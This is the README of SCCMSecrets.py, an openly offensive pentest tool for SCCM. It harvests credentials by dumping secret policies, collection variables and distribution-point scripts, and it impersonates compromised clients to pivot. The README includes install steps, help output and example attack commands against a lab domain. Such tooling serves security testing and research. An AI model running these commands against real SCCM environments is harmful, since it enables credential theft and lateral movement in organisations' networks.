# SCCMSecrets

SCCMSecrets.py is an SCCM policies exploitation tool. It goes beyond NAA credentials extraction, and aims to provide a comprehensive approach regarding SCCM policies exploitation. The tool can be executed from various levels of privileges, and will attempt to uncover potential misconfigurations related to policies distribution. It will dump the contents of all secret policies encountered as well as collection variables, in addition to package scripts hosted on the distribution points. Finally, it can be used throughout the intrusion process by configuring it to impersonate legitimate SCCM clients, in order to pivot across device collections.

For more details regarding the tool and its usage, see the associated article at:
https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial

# Installation

You can install SCCMSecrets.py by cloning the repository and installing the dependencies.
```
$ git clone https://github.com/synacktiv/SCCMSecrets
$ cd SCCMSecrets
$ python3 -m venv .venv && source .venv/bin/activate
$ python3 -m pip install -r requirements.txt
```

# Usage

```
$ python3 SCCMSecrets.py --help
                                                                                                                                                                                                                   
 Usage: SCCMSecrets.py [OPTIONS]                                                                                                                                                                                   
                                                                                                                                                                                                                   
╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --distribution-point         TEXT     The target distribution point [default: None] [required]                                                                                                               │
│    --client-name                TEXT     The name of the client that will be created in SCCM. An FQDN is expected (e.g. fake.corp.com) [default: None]                                                          │
│    --management-point           TEXT     The client's management point. Only necessary if the management point is not on the same machine as the distribution point. [default: None]                            │
│    --bruteforce-range           INTEGER  The number of package ID to bruteforce when performing anonymous policies scripts dump. Between 0 (00000) and 1048575 (FFFFF) [default: 4095]                          │
│    --extensions                 TEXT     Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts [default: .ps1, .bat, .xml, .txt, .pfx]          │
│    --username                   TEXT     The username for a domain account (can be a user account, or - preferably - a machine acount) [default: None]                                                          │
│    --password                   TEXT     The password for a domain account (can be a user account, or - preferably - a machine account) [default: None]                                                         │
│    --registration-sleep         INTEGER  The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to device      │
│                                          collections (3 minutes by default, may need to be increased)                                                                                                           │
│                                          [default: 180]                                                                                                                                                         │
│    --use-existing-device        TEXT     This option can be used to re-run SCCMSecrets.py using a previously registered device; or to impersonate a legitimate SCCM client. In both cases, it expects the path │
│                                          of a folder containing at least a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key).                                                         │
│                                          [default: None]                                                                                                                                                        │
│    --verbose                             Enable verbose output                                                                                                                                                  │
│    --help                                Show this message and exit.                                                                                                                                            │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

# Examples

Below are some example commands.

> Running SCCMSecrets.py without providing credentials (attempt to exploit automatic device approval for secret policies retrieval, attempt to exploit distribution point anonymous access for external resources dumping).
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test.sccm.lab
```

> Running SCCMSecrets.py with domain user credentials (attempt to exploit automatic device approval for secret policies retrieval, uses provided credentials or anonymous access for external resources dumping). Specify a shorter bruteforce range and specific file extensions to whitelist for external resources dumping.
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test2.sccm.lab --bruteforce-range 64 --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf' --username 'franck' --password 'rockthee' --verbose
```

> Running SCCMSecrets.py with domain machine account credentials (register a new approved device allowing to dump secret policies, uses provided credentials or anonymous access for external resources dumping). Specify a longer time to wait after registration to ensure the enrolled device is successfully added to collections before requesting policies.
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test3.sccm.lab --verbose --registration-sleep 300 --username 'azule$' --password 'Password123!'
```

> Running SCCMSecrets.py to impersonate a legitimate SCCM client that was compromised. The `CLIENT_DEVICE` folder contains a guid.txt file (GUID of the compromised client) and a key.pem file (the private key of the compromised client).
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test4.sccm.lab --verbose --use-existing-device CLIENT_DEVICE/ 
```
